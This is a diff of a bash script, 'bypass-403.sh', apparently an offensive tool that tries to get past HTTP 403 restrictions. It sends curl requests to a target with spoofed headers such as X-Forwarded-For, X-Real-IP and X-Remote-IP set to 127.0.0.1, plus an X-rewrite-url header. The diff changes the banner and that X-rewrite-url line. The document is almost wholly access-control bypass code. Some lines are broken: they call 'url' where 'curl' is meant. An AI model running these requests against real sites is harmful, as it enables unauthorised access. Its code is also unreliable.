@@ -1,6 +1,17 @@
 #! /bin/bash
 figlet Bypass-403
-echo "                                               DESCA"
+echo " 
+ ____                                   _  _    ___ ____  
+|  _ \                                 | || |  / _ \___ \ 
+| |_) |_   _ _ __   __ _ ___ ___ ______| || |_| | | |__) |
+|  _ <| | | | '_ \ / _` / __/ __|______|__   _| | | |__ < 
+| |_) | |_| | |_) | (_| \__ \__ \         | | | |_| |__) |
+|____/ \__, | .__/ \__,_|___/___/         |_|  \___/____/ 
+        __/ | |                                           
+       |___/|_|                                           
+
+                                                            BY DeSCA
+"
 echo "./bypass-403.sh https://example.com path"
 echo " "
 curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
@@ -21,8 +32,8 @@ curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded
 echo "  --> ${1}/${2} -H X-Forwarded-For: http://127.0.0.1"
 curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1:80" $1/$2
 echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1:80"
-curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: $2" $1
-echo "  --> ${1} -H X-rewrite-url: ${2}"
+curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: 127.0.0.1 $2" $1
+echo "  --> ${1} -H X-rewrite-url: 127.0.0.1"
 url -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Real-IP: 127.0.0.1" $1/$2
 echo "  --> ${1}/${2} -H X-Real-IP: 127.0.0.1"
 url -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Remote-IP: 127.0.0.1" $1/$2
